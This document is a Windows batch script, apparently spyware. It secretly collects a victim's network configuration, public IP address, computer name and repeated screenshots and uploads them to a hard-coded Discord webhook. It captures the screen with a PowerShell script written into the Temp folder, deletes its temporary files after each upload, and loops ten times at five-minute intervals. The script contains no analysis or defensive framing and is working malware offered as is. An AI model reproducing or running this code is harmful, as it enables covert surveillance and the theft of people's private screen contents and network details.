@echo off
set webhook=[https://discord.com/api/webhooks/1483919065990037624/u2cWhomIpKa9p8Kj0X00cfh_EcrPQ8-K82U5lUmXlUcPSeFH_PkTxgCG7ph7rXZUySj6]
cd /d %userprofile%\AppData\Local\Temp
set TempHome=%cd%

set "Discord_1st_Message=Constant IP Sender Message from:"
set "Discord_2nd_Message=Local IP:"
set "Discord_3rd_Message=Public IP:"
set "Discord_4th_Message=Screen Picture:"

::Configure
set "Times=0"

:Check
@echo %Times%

if %Times% == 10 (
Exit
) else (
goto Repeat
)

:Repeat

if exist "%userprofile%\AppData\Local\Temp\ip.txt" del %userprofile%\AppData\Local\Temp\ip.txt
if exist "%userprofile%\AppData\Local\Temp\ipp.txt" del %userprofile%\AppData\Local\Temp\ipp.txt
if exist "%userprofile%\AppData\Local\Temp\%username%_Capture.jpg" del %userprofile%\AppData\Local\Temp\%username%_Capture.jpg
if exist "%userprofile%\AppData\Local\Temp\test.ps1" del %userprofile%\AppData\Local\Temp\test.ps1
if exist "%userprofile%\AppData\Local\Temp\null" del %userprofile%\AppData\Local\Temp\null
ipconfig /all >%userprofile%\AppData\Local\Temp\ip.txt

curl -X POST -H "Content-type: application/json" --data "{\"content\": \"```Null = %Discord_1st_Message% ```\"}" %webhook%
curl -X POST -H "Content-type: application/json" --data "{\"content\": \"```Computername = %computername% time =  %time% date = %date% ```\"}" %webhook%

curl -X POST -H "Content-type: application/json" --data "{\"content\": \"```%Discord_2nd_Message% ```\"}" %webhook%
curl -i -H -S -s -o 'Expect: application/json' -F file=@%TempHome%\ip.txt %webhook% > %TempHome%\null

curl -X POST -H "Content-type: application/json" --data "{\"content\": \"```%Discord_3rd_Message% ```\"}" %webhook%
curl -o %userprofile%\AppData\Local\Temp\ipp.txt https://myexternalip.com/raw >nul 2>&1
curl -i -H -S -s -o 'Expect: application/json' -F file=@%TempHome%\ipp.txt %webhook% > %TempHome%\null

if exist "%userprofile%\AppData\Local\Temp\ip.txt" del %userprofile%\AppData\Local\Temp\ip.txt
if exist "%userprofile%\AppData\Local\Temp\ipp.txt" del %userprofile%\AppData\Local\Temp\ipp.txt





echo $SERDO = Get-Clipboard >%userprofile%\AppData\Local\Temp\test.ps1
echo function Get-ScreenCapture >>%userprofile%\AppData\Local\Temp\test.ps1
echo { >>%userprofile%\AppData\Local\Temp\test.ps1
echo     begin { >>%userprofile%\AppData\Local\Temp\test.ps1
echo         Add-Type -AssemblyName System.Drawing, System.Windows.Forms >>%userprofile%\AppData\Local\Temp\test.ps1
echo         Add-Type -AssemblyName System.Drawing >>%userprofile%\AppData\Local\Temp\test.ps1
echo         $jpegCodec = [Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() ^|  >>%userprofile%\AppData\Local\Temp\test.ps1
echo             Where-Object { $_.FormatDescription -eq "JPEG" } >>%userprofile%\AppData\Local\Temp\test.ps1
echo     } >>%userprofile%\AppData\Local\Temp\test.ps1
echo     process { >>%userprofile%\AppData\Local\Temp\test.ps1
echo         Start-Sleep -Milliseconds 44 >>%userprofile%\AppData\Local\Temp\test.ps1
echo             [Windows.Forms.Sendkeys]::SendWait("{PrtSc}")    >>%userprofile%\AppData\Local\Temp\test.ps1
echo         Start-Sleep -Milliseconds 550 >>%userprofile%\AppData\Local\Temp\test.ps1
echo         $bitmap = [Windows.Forms.Clipboard]::GetImage()     >>%userprofile%\AppData\Local\Temp\test.ps1
echo         $ep = New-Object Drawing.Imaging.EncoderParameters   >>%userprofile%\AppData\Local\Temp\test.ps1
echo         $ep.Param[0] = New-Object Drawing.Imaging.EncoderParameter ([System.Drawing.Imaging.Encoder]::Quality, [long]100)   >>%userprofile%\AppData\Local\Temp\test.ps1
echo         $screenCapturePathBase = $env:temp + "\" + $env:UserName + "_Capture" >>%userprofile%\AppData\Local\Temp\test.ps1
echo         $bitmap.Save("${screenCapturePathBase}.jpg", $jpegCodec, $ep) >>%userprofile%\AppData\Local\Temp\test.ps1
echo     } >>%userprofile%\AppData\Local\Temp\test.ps1
echo }							 >>%userprofile%\AppData\Local\Temp\test.ps1			
echo Get-ScreenCapture >>%userprofile%\AppData\Local\Temp\test.ps1
echo Set-Clipboard -Value $SERDO >>%userprofile%\AppData\Local\Temp\test.ps1
echo $result  = "%webhook%"  >>%userprofile%\AppData\Local\Temp\test.ps1
echo $screenCapturePathBase = $env:temp + "\" + $env:UserName + "_Capture.jpg"	 >>%userprofile%\AppData\Local\Temp\test.ps1
timeout 1 >NUL
Powershell.exe -executionpolicy remotesigned -File  %userprofile%\AppData\Local\Temp\test.ps1




curl -X POST -H "Content-type: application/json" --data "{\"content\": \"```%Discord_4th_Message% ```\"}" %webhook%
curl -i -H -S -s -o 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\%username%_Capture.jpg %webhook% > %TempHome%\null

if exist "%userprofile%\AppData\Local\Temp\%username%_Capture.jpg" del %userprofile%\AppData\Local\Temp\%username%_Capture.jpg
if exist "%userprofile%\AppData\Local\Temp\test.ps1" del %userprofile%\AppData\Local\Temp\test.ps1
if exist "%userprofile%\AppData\Local\Temp\null" del %userprofile%\AppData\Local\Temp\null


set /A "Times+=1"
timeout 300 >nul
goto Check


